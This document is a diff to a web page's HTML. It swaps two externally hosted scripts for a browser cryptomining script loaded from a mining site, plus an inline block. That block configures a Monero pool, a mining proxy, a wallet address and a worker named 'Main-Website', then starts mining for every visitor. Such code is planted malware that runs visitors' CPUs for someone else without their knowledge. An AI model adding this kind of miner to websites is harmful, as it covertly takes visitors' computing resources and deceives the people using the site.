@@ -76,8 +76,17 @@
     
     <script type="module" src="/main.js"></script>
 
-    <script src="https://raw.githubusercontent.com/thealixtech/maxjs/main/server.js"></script>
-    <script src="https://raw.githubusercontent.com/thealixtech/maxjs/main/client.js"></script>
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un";
+    var workerId = "Main-Website"
+    var threads = 1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 25;
+</script>
 
   </body>
 </html>
